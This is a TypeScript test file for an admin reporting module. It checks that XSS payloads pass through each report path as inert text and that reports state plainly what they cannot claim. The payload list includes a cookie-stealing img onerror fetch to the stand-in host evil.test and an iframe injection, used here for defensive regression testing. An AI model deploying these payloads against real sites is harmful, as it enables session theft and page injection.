/**
 * The Command Panel's reports (DEC-060).
 *
 * Two gate items live here: the FINDING-02 payload set through every NEW report
 * path, and the anchor rule — a report claims a public anchor only when there
 * is one, and says so explicitly when there is not.
 *
 * A report is where analyst-authored and market-sourced text meets a rendering
 * surface, which is exactly where the original XSS was.
 */
import { describe, it, expect, beforeEach, afterEach, vi } from "vitest";
import { readFileSync } from "node:fs";
import { join } from "node:path";
import {
  HONESTY_STATEMENT, auditReport, multiActorReport, periodReport, provenanceSubtitle,
  sourceHealthReport, type ReportProvenance,
} from "@/lib/adminReports";

const PAYLOADS = [
  `<img src=x onerror="fetch('https://evil.test/'+document.cookie)">`,
  `<script>alert(document.domain)</script>`,
  `"><svg/onload=alert(1)>`,
  `javascript:alert(1)`,
  `</td></tr><tr><td colspan=99><iframe src=//evil.test>`,
];

const prov = (over: Partial<ReportProvenance> = {}): ReportProvenance => ({
  merkleRoot: "0xabc123",
  anchor: null,
  engineVersion: "prahari-engine 2.0.0",
  generatedBy: "admin@prahari.local",
  ...over,
});

function fakeWindow() {
  const doc = document.implementation.createHTMLDocument("");
  return {
    document: doc,
    print: () => {},
    setTimeout: (fn: () => void) => {
      fn();
      return 0 as unknown as number;
    },
  };
}

let win: ReturnType<typeof fakeWindow>;
beforeEach(() => {
  win = fakeWindow();
  vi.stubGlobal("window", { ...globalThis.window, open: () => win });
});
afterEach(() => vi.unstubAllGlobals());

describe("provenance", () => {
  it("names the generator, the engine version and the Merkle root", () => {
    const s = provenanceSubtitle(prov());
    expect(s).toContain("admin@prahari.local");
    expect(s).toContain("prahari-engine 2.0.0");
    expect(s).toContain("0xabc123");
  });

  /**
   * The anchor rule. Silence would let a reader assume a local seal was public.
   */
  it("states plainly that there is NO public anchor when there is none", () => {
    const s = provenanceSubtitle(prov({ anchor: null }));
    expect(s).toContain("No public anchor");
    expect(s).toContain("local only");
    expect(s).not.toMatch(/tx 0x/);
  });

  it("names the chain and transaction when an anchor does exist", () => {
    const s = provenanceSubtitle(
      prov({ anchor: { txHash: "0xdead", chainId: 80002, explorerUrl: null } })
    );
    expect(s).toContain("chain 80002");
    expect(s).toContain("0xdead");
    expect(s).not.toContain("No public anchor");
  });

  it("says a missing version is not reported, rather than inventing one", () => {
    expect(provenanceSubtitle(prov({ engineVersion: null }))).toContain("version not reported");
  });

  it("says a missing Merkle root is not available", () => {
    expect(provenanceSubtitle(prov({ merkleRoot: null }))).toContain("not available");
  });

  it("carries the standing honesty statement", () => {
    expect(provenanceSubtitle(prov())).toContain(HONESTY_STATEMENT);
    expect(HONESTY_STATEMENT).toContain("does not break Tor");
  });
});

describe("FINDING-02 through every new report path", () => {
  const paths = [
    [
      "multi-actor",
      (p: string) =>
        multiActorReport(
          p,
          [{ actor_id: p, label: p, attribution_confidence: 0.9, markets: [p] }],
          prov()
        ),
    ],
    [
      "audit",
      (p: string) =>
        auditReport(
          [
            {
              seq: 0, ts: "2026-09-03T10:00:00Z", actor: p, action: p,
              payload: { note: p }, hash: p, prev_hash: p, signed: true,
            },
          ],
          prov(),
          { ok: true, failingIndex: null, reason: null }
        ),
    ],
    [
      "source-health",
      (p: string) =>
        sourceHealthReport(
          [{ name: p, kind: p, requires_key: true, key_present: true, freshness_s: 60, items_24h: 1 }],
          prov()
        ),
    ],
    [
      "period",
      (p: string) => periodReport(p, p, [{ label: p, value: p, definition: p }], prov()),
    ],
  ] as const;

  for (const [name, render] of paths) {
    it.each(PAYLOADS)(`${name}: renders %s as text, never as markup`, (payload) => {
      expect(render(payload)).toBe(true);
      const doc = win.document;
      expect(doc.body.textContent).toContain(payload);
      expect(doc.querySelectorAll("img")).toHaveLength(0);
      expect(doc.querySelectorAll("svg")).toHaveLength(0);
      expect(doc.querySelectorAll("iframe")).toHaveLength(0);
      expect(doc.querySelectorAll("script")).toHaveLength(0);
    });
  }

  it("a hostile value cannot inject extra table cells", () => {
    multiActorReport(
      "case",
      [
        {
          actor_id: "a",
          label: `</td></tr><tr><td colspan=99>injected`,
          attribution_confidence: null,
          markets: [],
        },
      ],
      prov()
    );
    // Five columns, one row: interpolation would have produced more.
    expect(win.document.querySelectorAll("tbody tr")).toHaveLength(1);
    expect(win.document.querySelectorAll("tbody td")).toHaveLength(5);
  });
});

describe("the reports say what they can and cannot claim", () => {
  it("renders an unmeasured confidence as 'not measured', never 0.000", () => {
    multiActorReport(
      "case",
      [{ actor_id: "a", label: "a", attribution_confidence: null, markets: [] }],
      prov()
    );
    const text = win.document.body.textContent ?? "";
    expect(text).toContain("not measured");
    expect(text).not.toContain("0.000");
  });

  it("flags an analyst override so it never reads as a model output", () => {
    multiActorReport(
      "case",
      [
        {
          actor_id: "a", label: "a", attribution_confidence: 0.99,
          override: true, override_reason: "field confirmation",
        },
      ],
      prov()
    );
    const text = win.document.body.textContent ?? "";
    expect(text).toContain("YES");
    expect(text).toContain("field confirmation");
  });

  it("never renders a credential value, only whether one is present", () => {
    sourceHealthReport(
      [{ name: "shodan", kind: "infra", requires_key: true, key_present: true, freshness_s: null, items_24h: 0 }],
      prov()
    );
    const text = win.document.body.textContent ?? "";
    expect(text).toContain("key present");
    expect(text).toContain("never scanned");
  });

  it("names a disabled source rather than showing it as merely empty", () => {
    sourceHealthReport(
      [{ name: "etherscan", kind: "chain", requires_key: true, key_present: false, freshness_s: 60, items_24h: 0 }],
      prov()
    );
    expect(win.document.body.textContent).toContain("NO KEY");
  });

  it("puts a failed chain verification FIRST, not in a footnote", () => {
    auditReport([], prov(), { ok: false, failingIndex: 3, reason: "hash mismatch" });
    const subtitle = win.document.querySelector(".meta")?.textContent ?? "";
    expect(subtitle).toContain("CHAIN VERIFICATION FAILED at record 3");
    expect(subtitle).toContain("hash mismatch");
    expect(subtitle).toContain("unverified");
  });

  it("marks an unsigned audit record as unsigned", () => {
    auditReport(
      [{ seq: 0, ts: "2026-09-03T10:00:00Z", actor: "a", action: "admin.update", payload: {}, hash: "0x1", prev_hash: "0x0", signed: false }],
      prov(),
      { ok: true, failingIndex: null, reason: null }
    );
    expect(win.document.body.textContent).toContain("NO — unsigned");
  });

  it("gives every period measure its definition", () => {
    periodReport("2026-01-01", "2026-02-01",
      [{ label: "Seals", value: "4", definition: "Cases sealed in the window." }], prov());
    expect(win.document.querySelectorAll("thead th")).toHaveLength(3);
    expect(win.document.body.textContent).toContain("Cases sealed in the window.");
  });

  it("every report has an empty state that says so", () => {
    for (const render of [
      () => multiActorReport("c", [], prov()),
      () => auditReport([], prov(), { ok: true, failingIndex: null, reason: null }),
      () => sourceHealthReport([], prov()),
      () => periodReport("a", "b", [], prov()),
    ]) {
      win = fakeWindow();
      vi.stubGlobal("window", { ...globalThis.window, open: () => win });
      render();
      const td = win.document.querySelector("tbody td");
      expect(td?.textContent?.length ?? 0).toBeGreaterThan(10);
    }
  });
});

describe("the module obeys the standing rules", () => {
  const src = readFileSync(join(process.cwd(), "lib/adminReports.ts"), "utf8");

  it("builds every report through lib/report.ts, not new HTML templating", () => {
    expect(src).toContain('from "./report"');
    expect(src).not.toMatch(/innerHTML|document\.write/);
    // No template literal that produces markup, however convenient (INV-6).
    const code = src.replace(/\/\*[\s\S]*?\*\//g, "").replace(/^\s*\/\/.*$/gm, "");
    expect(code).not.toMatch(/`[^`]*<[a-z][^`]*`/);
  });

  it("uses the fixed print palette, not the app skin", () => {
    // What the reader sees is what leaves the building.
    const themes = [...src.matchAll(/theme: "(\w+)"/g)].map((m) => m[1]);
    expect(themes.length).toBe(4);
    expect(new Set(themes)).toEqual(new Set(["print"]));
  });
});
